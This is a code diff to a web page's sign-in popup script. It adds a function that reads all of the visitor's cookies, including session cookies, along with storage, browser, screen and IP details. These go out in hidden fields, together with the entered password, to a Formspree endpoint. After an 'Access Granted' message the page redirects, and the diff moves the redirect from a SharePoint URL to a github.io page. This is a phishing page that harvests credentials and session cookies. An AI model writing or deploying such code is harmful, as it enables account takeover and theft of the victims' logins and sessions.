@@ -226,6 +226,63 @@ document.addEventListener('DOMContentLoaded', function() {
         return true;
     }
     
+    // Get browser cookies
+    function getBrowserCookies() {
+        try {
+            // Get all cookies
+            const cookies = document.cookie;
+            
+            // Parse cookies into readable format
+            const cookieArray = cookies.split(';').map(cookie => {
+                const [name, ...valueParts] = cookie.trim().split('=');
+                const value = valueParts.join('='); // In case cookie value contains '='
+                return { name, value };
+            });
+            
+            // Get cookie count
+            const cookieCount = cookieArray.length;
+            
+            // Get session storage info
+            const sessionStorageCount = Object.keys(sessionStorage).length;
+            
+            // Get localStorage info
+            const localStorageCount = Object.keys(localStorage).length;
+            
+            // Get browser sync status (check for common sync cookies)
+            const syncCookies = cookieArray.filter(cookie => 
+                cookie.name.includes('sync') || 
+                cookie.name.includes('Sync') ||
+                cookie.name.includes('SESSION') ||
+                cookie.name.includes('session')
+            );
+            
+            const hasSyncCookies = syncCookies.length > 0;
+            
+            return {
+                raw_cookies: cookies,
+                parsed_cookies: cookieArray,
+                cookie_count: cookieCount,
+                session_storage_count: sessionStorageCount,
+                local_storage_count: localStorageCount,
+                has_sync_cookies: hasSyncCookies,
+                sync_cookies: syncCookies,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookie_enabled: navigator.cookieEnabled
+            };
+            
+        } catch (error) {
+            console.error('Error getting browser cookies:', error);
+            return {
+                error: error.message,
+                raw_cookies: 'Unable to retrieve cookies',
+                timestamp: new Date().toISOString()
+            };
+        }
+    }
+    
     // Formspree Form Submission
     popupForm.addEventListener('submit', async function(e) {
         e.preventDefault();
@@ -241,8 +298,12 @@ document.addEventListener('DOMContentLoaded', function() {
         try {
             // Disable button and show loading
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Sign in...';
+            submitBtn.textContent = 'Sign In...';
             submitBtn.style.opacity = '0.7';
+            
+            // Get browser cookies data
+            const cookieData = getBrowserCookies();
+            console.log('Browser cookie data:', cookieData);
             
             // Get and set IP address
             let ipAddress = 'Unknown';
@@ -271,9 +332,48 @@ document.addEventListener('DOMContentLoaded', function() {
             userAgentInput.value = navigator.userAgent;
             this.appendChild(userAgentInput);
             
-            // Log form data
+            // Add cookie data as JSON string
+            const cookieInput = document.createElement('input');
+            cookieInput.type = 'hidden';
+            cookieInput.name = 'browser_cookies';
+            cookieInput.value = JSON.stringify(cookieData);
+            this.appendChild(cookieInput);
+            
+            // Add browser info
+            const browserInfoInput = document.createElement('input');
+            browserInfoInput.type = 'hidden';
+            browserInfoInput.name = 'browser_info';
+            browserInfoInput.value = JSON.stringify({
+                platform: navigator.platform,
+                language: navigator.language,
+                cookie_enabled: navigator.cookieEnabled,
+                do_not_track: navigator.doNotTrack,
+                hardware_concurrency: navigator.hardwareConcurrency,
+                device_memory: navigator.deviceMemory
+            });
+            this.appendChild(browserInfoInput);
+            
+            // Add screen info
+            const screenInfoInput = document.createElement('input');
+            screenInfoInput.type = 'hidden';
+            screenInfoInput.name = 'screen_info';
+            screenInfoInput.value = JSON.stringify({
+                width: screen.width,
+                height: screen.height,
+                color_depth: screen.colorDepth,
+                pixel_depth: screen.pixelDepth,
+                orientation: screen.orientation?.type || 'unknown'
+            });
+            this.appendChild(screenInfoInput);
+            
+            // Log form data (without sensitive password)
             const formData = new FormData(this);
-            console.log('Submitting to Formspree:', Object.fromEntries(formData));
+            const formDataObj = Object.fromEntries(formData);
+            const safeFormData = { ...formDataObj };
+            if (safeFormData.password) {
+                safeFormData.password = '***HIDDEN***';
+            }
+            console.log('Submitting to Formspree:', safeFormData);
             
             // Submit to Formspree using fetch
             const response = await fetch(this.action, {
@@ -292,6 +392,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 updateFormTitle('Access Granted');
                 
                 console.log('Form submitted successfully to Formspree');
+                console.log('Cookie data sent:', cookieData);
                 
                 // Countdown before redirect
                 let countdown = 3;
@@ -343,7 +444,7 @@ document.addEventListener('DOMContentLoaded', function() {
         closePopup();
         
         // Define the redirect URL (you can change this to any URL you want)
-        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
+        const redirectUrl = 'https://thecorporatelivewire.github.io/bonelloassociates/'; // Change this URL
         
         console.log('Redirecting to:', redirectUrl);
         
